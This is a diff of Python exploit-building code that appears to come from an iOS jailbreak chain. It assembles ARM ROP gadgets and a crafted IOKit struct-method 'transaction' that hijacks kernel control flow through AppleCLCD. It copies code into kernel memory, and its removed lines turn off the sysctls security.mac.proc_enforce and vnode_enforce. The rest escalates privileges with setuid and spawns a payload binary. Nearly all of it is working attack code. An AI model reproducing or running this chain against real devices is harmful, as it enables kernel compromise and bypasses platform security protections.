@@ -67,19 +67,21 @@ def mov_r3_r7():
 
 
 # not anymore   e89bb951	ldm	fp, {r0, r4, r6, r8, fp, ip, sp, pc}
-#   e89bed06 	ldm	fp, {r1, r2, r8, sl, fp, sp, lr, pc}
+#               e89bed06 	ldm	fp, {r1, r2, r8, sl, fp, sp, lr, pc}
 kernel_ldm = dmini.cur.find_basic('- 06 ed 9b e8')
 init('R1', 'R2', 'R8', 'R10', 'R11', 'SP', 'LR', 'PC')
 m = pointed('')
 set_fwd('SP', pointer(m))
 heapadd(m)
 mov_r3_r7()
+make_r4_avail()
 funcall('_copyin', pointer(weirdfile), code_addr, len(weirdfile))
 funcall('_flush_dcache', code_addr, len(weirdfile), 0)
 set_fwd('PC', code_addr)
 
 kstuff = finalize(None, must_be_simple=False)
-assert len(kstuff) == 0x68
+#heapdump(kstuff)
+assert len(kstuff) == 0x70
 
 dmini.init(cachefile, True)
 
@@ -116,7 +118,13 @@ store_r0_to(task_self_p)
 
 kstuffp = ptr(kstuff)
 
-transaction = '\xee' * 8 + I(kstuffp) + '\xee' * (0x58 - 0xc) + I(kernel_ldm) + '\xee' * (0xd8 - 0x5c)
+transaction = troll_string('\x00' * 0xd8)
+transaction[0:4] = transaction[4:8] = I(0xeeeeeeee)
+transaction[8:0xc] = I(kstuffp) # surface saved in r11
+transaction[0x58:0x5c] = I(kernel_ldm)
+transaction[0xb8:0xbc] = I(6) # run iterations 1 and 2 (first loop bails at 1)
+transaction = simplify(transaction)
+assert len(transaction) == 0xd8
 
 # The manpage says this returns EINVAL, but in fact the kernel handles it.
 funcall('_mlock', kstuffp, len(kstuff)); dbg_result()
@@ -127,15 +135,19 @@ if mode == 'two':
     # XXX is this necessary? it's from star
     funcall('iokit._IOKitWaitQuiet', 0, ptrI(0, 0, 0))
 
-funcall('iokit._IOServiceMatching', ptr('AppleRGBOUT', True))
+#funcall('iokit._IOServiceMatching', ptr('AppleRGBOUT', True))
+funcall('iokit._IOServiceMatching', ptr('AppleCLCD', True))
 matching, matchingp = stackunkpair()
 store_r0_to(matchingp)
 funcall('iokit._IOServiceGetMatchingService', 0, matching)
 connect = ptrI(0)
 funcall('iokit._IOServiceOpen', None, task_self, 0, connect); dbg_result()
 
-funcall('iokit._IOConnectCallStructMethod', connect, 5, ptr(transaction), len(transaction), 0, 0, load_r0=True)
-dbg_result(); funcall('_abort')
+funcall('iokit._IOConnectCallScalarMethod', connect, 21, ptrI(0xeeeeeeee, 0xeeeeeeee), 2, 0, 0, load_r0=True); dbg_result()
+
+funcall('iokit._IOConnectCallStructMethod', connect, 5, ptr(transaction), len(transaction), 0, 0, load_r0=True); dbg_result()
+#funcall('_sleep', 1000)
+#dbg_result(); funcall('_abort')
 
 
 # do some housekeeping
@@ -162,12 +174,9 @@ if mode == 'dejavu':
     funcall('_posix_spawn', 0x11000000, locutus_str, 0, 0, ptrI(locutus_str, 0), zerop)
     dbg_result()
 
-funcall('_sysctlbyname', ptr('security.mac.proc_enforce', True), 0, 0, zerop, 4)
-dbg_result()
+# XXX vnode enforce
 
 if mode == 'dejavu':
-    funcall('_sysctlbyname', ptr('security.mac.vnode_enforce', True), 0, 0, zerop, 4)
-    dbg_result()
     funcall('_geteuid')
     funcall('_setuid', None); dbg_result()
 
@@ -176,19 +185,16 @@ if mode == 'dejavu':
     set_r0_to(1337)
     fancy_set_sp_to(reloc(0xe, 0x60c)) # offset determined by experiment
 else:
-    quote = '(You got blood on my suit.)'
-    funcall('_write', 2, ptr(quote), len(quote))
     lunchd = ptr('/sbin/lunchd', True)
     funcall('_execl', lunchd, lunchd, 0)
 
 goo.sheap.append(weirdfile)
 
 if mode == 'dejavu':
-    final = finalize(reloc(0xd, 0))
-
+    final = pad(finalize(reloc(0xd, 0)), 4)
 
     # add sp, #400; pop {r4, r5, pc}
-    parse_callback = dmini.cur.find_basic('+ 64 b0 30 bd').value
+    parse_callback = 0xdeadbeef #dmini.cur.find_basic('+ 64 b0 30 bd').value
     actual_parse_callback = dmini.cur.private_sym('ft._T1_Parse_Glyph').value
 
     final = final.unpack()
